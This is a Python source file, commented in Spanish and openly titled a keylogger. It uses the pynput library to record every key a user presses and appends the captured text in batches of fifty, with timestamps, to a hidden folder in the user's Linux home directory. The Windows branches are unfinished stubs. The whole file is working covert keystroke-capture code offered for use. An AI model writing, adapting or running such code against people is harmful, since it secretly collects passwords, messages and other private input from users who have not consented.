# -*-encoding: utf-8 -*-
##############################################################################
# Programa: keylogger                                                        #
# Proposito: guardar en un archivo todas las teclas precionadas del teclado  #
# Autor: Mauricio Roman Ruiz bárcenas                                        #
# Fecha: 16/05/2019                                                          #
# Correo: mauro_ruiz2001@hotmail.com                                         #
#         crostow.ewinkeiton@gmail.com                                       #
##############################################################################


# Importamos las librerias necesarias para el funcionamiento del programa
import datetime
import sys
import os
import getpass
from pynput.keyboard import Listener

Sistema = sys.platform
Usuario = getpass.getuser()
Info_teclado = []


# Creamos la carpeta en el directorio
def Creacion_directorio():
    if Sistema == "linux":
        os.mkdir("/home/"+Usuario+"/.keylogger/")
    elif Sistema == "Windows":
        pass
        # print("en construccion")
        # print("verificar como va escrita la ruta carpeta")
        # os.mkdir(u"C:\\")


# Creamos el archivo  dentro de la carpeta
def Creacion_archivo():
    if Sistema == "linux":
        archivo_salida = open(
            "/home/"+Usuario+"/.keylogger/informacion.txt", "w")
        archivo_salida.close()
    elif Sistema == "Windows":
        pass
        # print("en construccion")
        # print("verificar como va escrita la ruta archivo")
        # os.mkdir(u"C:\\")


# Verificamos que exita la carpeta en caso contrario la creamos
def Verificacion_carpeta():
    if Sistema == "linux":
        if os.path.exists("/home/"+Usuario+"/.keylogger/"):
            pass
        else:
            Creacion_directorio()
    elif Sistema == "Windows":
        pass
        # print("en construccion")
        # print("verificar como va escrita la ruta")
        # os.mkdir(u"C:\\")


# Verificamos que exista el archivo en caso contrario lo creamos
def Verificacion_archivo():
    if Sistema == "linux":
        if os.path.exists("/home/" + Usuario + "/.keylogger/informacion.txt"):
            pass
        else:
            Creacion_archivo()
    elif Sistema == "Windows":
        pass
        # print("en construccion")
        # print("verificar como va escrita la ruta")
        # os.mkdir(u"C:\\")


# Metodo que detecta cuando se pulsa una tecla y la almacena
def on_press(tecla_pulsada):
    global Info_teclado
    Info_teclado.append(str(tecla_pulsada))

    if str(tecla_pulsada) == 'Key.backspace':
        if len(Info_teclado) == 1:
            Info_teclado.pop()
        elif len(Info_teclado) > 1:
            Info_teclado.pop()
            Info_teclado.pop()
    if len(Info_teclado) == 50:
        guardar_informacion(Info_teclado)


# Metodo para guardar informacion almacenada
def guardar_informacion(Info_teclado):
    # Obtener la fecha y la hora actual del sistema.
    hora_y_fecha = datetime.datetime.now().strftime("_%d-%m-%Y-%H-%M-%S")
    # Abrimos el archivo donde se guardara la informacion y lo asignamos a la
    # variable archivo_salida
    archivo_salida = open(
        "/home/" + Usuario + "/.keylogger/informacion.txt", "a")
    # Escribimos en el archivo un salto de linea
    archivo_salida.write("\n")
    # Escribimos un encabezado con la hora y fecha de escritura
    archivo_salida.write(
        "====================="+hora_y_fecha+"=====================")
    # Escribimos otro salto de linea
    archivo_salida.write("\n")

    # recorremos la informacion para procesarla
    for i in Info_teclado:
        if i == "Key.enter":
            archivo_salida.write("\n")
        if i == "Key.space":
            archivo_salida.write(" ")
        if i == "Key.tab":
            archivo_salida.write("\t")
        elif i[:4] == "Key.":
            pass
        else:
            archivo_salida.write(str(i).replace("'", ""))
    # Cerramos el archivo
    archivo_salida.close()
    # limpiamos la lista para volcer a escribirla
    Info_teclado.clear()


# Verificamos que la carpeta y el archivo existan
Verificacion_carpeta()
Verificacion_archivo()
with Listener(on_press=on_press) as listener:
    listener.join()
